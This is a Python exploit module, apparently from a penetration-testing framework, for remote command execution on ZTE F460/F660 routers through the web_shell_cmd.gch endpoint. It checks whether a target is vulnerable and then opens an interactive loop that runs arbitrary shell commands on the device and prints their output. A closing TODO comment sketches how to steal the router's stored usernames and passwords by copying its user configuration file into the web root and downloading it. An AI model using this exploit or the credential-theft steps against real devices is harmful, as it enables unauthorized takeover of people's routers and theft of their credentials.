#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re

import requests

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'ZTE F460/F660 remote command execute'
    }

    prompt = 'fx60_rce'

    def __init__(self):
        super().__init__()
        self.url = "http://{}:{}/web_shell_cmd.gch"
        self.headers = {u'Content-Type': u'multipart/form-data'}
        self.data = {'IF_ACTION': 'apply',
                     'IF_ERRORSTR': 'SUCC',
                     'IF_ERRORPARAM': 'SUCC',
                     'IF_ERRORTYPE': '-1',
                     'Cmd': '',
                     'CmdAck': ''}
        self.s = requests.session()
        self.init = False

    def check(self, host, port, timeout):
        cmd = 'echo {}'.format(utils.random_text(10))
        response = self.execute(host, port, timeout, cmd)
        self.s.close()
        if response in cmd:
            self.print_check_result(True, host)
            return True  # target is vulnerable
        self.print_check_result(False, host)
        return False

    def run(self, host, port, timeout):
        self.command_loop(host, port, timeout)
        self.s.close()

    def command_loop(self, host, port, timeout):
        while True:
            cmd = input("cmd > ")
            if cmd in ['exit', 'quit']:
                return

            response = self.execute(host, port, timeout, cmd)
            utils.print_info(response)

    def execute(self, host, port, timeout, cmd):
        if not self.init:
            self.url = self.url.format(host, port)
            self.init = True

        self.data['Cmd'] = cmd
        resp, err = self.http_post(self.s, self.url, timeout, self.data)
        if err:
            self.print_requests_err(host, port, err)
            return ''
        else:
            if resp.status_code == requests.codes.ok:
                regexp = re.compile('<textarea cols="" rows="" id="Frm_CmdAck" class="textarea_1">(.*?)</textarea>',
                                    re.I | re.S)
                match = regexp.search(resp.text)
                if match:
                    return match.group(1).strip()

            return ""

    # TODO cp /userconfig/cfg/db_user_cfg.xml /home/httpd wget db_user_cfg.xml zlib decompress Username Password
